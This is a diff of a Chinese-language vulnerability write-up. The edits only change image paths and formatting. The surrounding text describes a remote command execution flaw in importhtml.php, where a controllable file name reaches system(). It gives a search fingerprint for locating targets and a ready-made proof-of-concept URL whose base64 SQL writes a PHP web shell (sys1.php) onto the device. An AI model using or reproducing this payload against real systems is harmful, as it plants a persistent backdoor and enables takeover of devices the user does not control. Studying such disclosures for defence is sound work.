@@ -20,11 +20,7 @@ body="mask.style.visibility"
 
 登录页面
 
-
-
-![](images/202202162227588.png)
-
-
+![](../.gitbook/assets/202202162227588.png)
 
 出现漏洞的文件 **importhtml.php**
 
@@ -112,7 +108,7 @@ function exportHtmlMail($filename,$sql){
 }
 ```
 
-这里可以发现通过base64解码后执行的Sql语句结果传入函数exportHtmlMail中调用system执行, 而 $post_filename 可控
+这里可以发现通过base64解码后执行的Sql语句结果传入函数exportHtmlMail中调用system执行, 而 $post\_filename 可控
 
 ```php
 $str = "/usr/bin/cap2con $post_filename pop";
@@ -120,10 +116,10 @@ $str = "/usr/bin/cap2con $post_filename pop";
 
 验证POC
 
-```plain
+```
 https://xxx.xxx.xxx.xxx/importhtml.php?type=exporthtmlmail&tab=tb_RCtrlLog&sql=c2VsZWN0IDB4M2MzZjcwNjg3MDIwNjU2MzY4NmYyMDczNzk3Mzc0NjU2ZDI4MjQ1ZjUwNGY1MzU0NWIyMjYzNmQ2NDIyNWQyOTNiM2YzZSBpbnRvIG91dGZpbGUgJy91c3IvaGRkb2NzL25zZy9hcHAvc3lzMS5waHAn
 ```
 
 访问成功后会触发下载日志文件，再访问 sys1.php
 
-![](images/202202162227990.png)
+![](../.gitbook/assets/202202162230632.png)
